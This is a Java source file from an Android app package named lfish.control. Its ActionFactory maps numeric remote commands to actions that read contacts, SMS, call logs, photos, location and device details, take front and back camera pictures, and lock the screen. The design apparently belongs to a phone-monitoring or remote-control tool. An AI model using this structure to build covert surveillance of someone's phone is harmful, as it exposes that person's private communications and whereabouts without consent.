package com.lfish.control.action;

import java.util.HashMap;
import java.util.Map;
import android.annotation.TargetApi;
import android.os.Build;
import com.lfish.control.action.actiondomian.GetCallRecodeAction;
import com.lfish.control.action.actiondomian.GetContactAction;
import com.lfish.control.action.actiondomian.GetDeviceMsgAction;
import com.lfish.control.action.actiondomian.GetInstallAppsAction;
import com.lfish.control.action.actiondomian.GetLocationAction;
import com.lfish.control.action.actiondomian.GetPhotosAction;
import com.lfish.control.action.actiondomian.GetSmsAction;
import com.lfish.control.action.actiondomian.GetUserAcitivityAction;
import com.lfish.control.action.actiondomian.LockScreenAction;
import com.lfish.control.action.actiondomian.TackPhoto_BackAction;
import com.lfish.control.action.actiondomian.TackPhoto_FrontAction;

public class ActionFactory {
	
	private static ActionFactory actionFactory;
	private Map<Integer,Class> actionSet =new HashMap<Integer,Class>();
	private Map<Long,Thread> actionPoll =new HashMap<Long,Thread>();
	
	public static ActionFactory getInstance(){
		if(actionFactory==null){
			actionFactory  = new ActionFactory();
		}
		return actionFactory;
	}

	private ActionFactory() {
		super();
		// TODO Auto-generated constructor stub
	}
	
	public void init(){ 
		
		actionSet.put(1, GetDeviceMsgAction.class);
		actionSet.put(9, TackPhoto_FrontAction.class);
		actionSet.put(10, TackPhoto_BackAction.class);
		actionSet.put(5, GetLocationAction.class);
		actionSet.put(8, GetPhotosAction.class);
		actionSet.put(7, GetInstallAppsAction.class);
		actionSet.put(2, GetContactAction.class);
		actionSet.put(12, GetSmsAction.class);
		actionSet.put(6, GetCallRecodeAction.class);
		actionSet.put(11, LockScreenAction.class);
		actionSet.put(13, this.getClass()); // 拦截,无需配置
		actionSet.put(14, GetUserAcitivityAction.class); // 拦截,无需配置
		
	}
	
	public Map<Integer,Class> getActionSet(){
		return actionSet;
	}
	
	@TargetApi(Build.VERSION_CODES.KITKAT)
	public BaseBeanAction getAction(int cmd){
		Class clazz = actionSet.get(cmd);
		if(clazz!=null){
			try {
				  Object newInstance = clazz.newInstance();
				  return (BaseBeanAction) newInstance;
			} catch (InstantiationException | IllegalAccessException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		return null;
	}
	
	public void runAction(BaseBeanAction baseBeanAction){
		Thread actionRunner = new Thread(baseBeanAction);
		actionRunner.getId();
		actionRunner.start();
		actionPoll.put(actionRunner.getId(), actionRunner);
	}
	
}
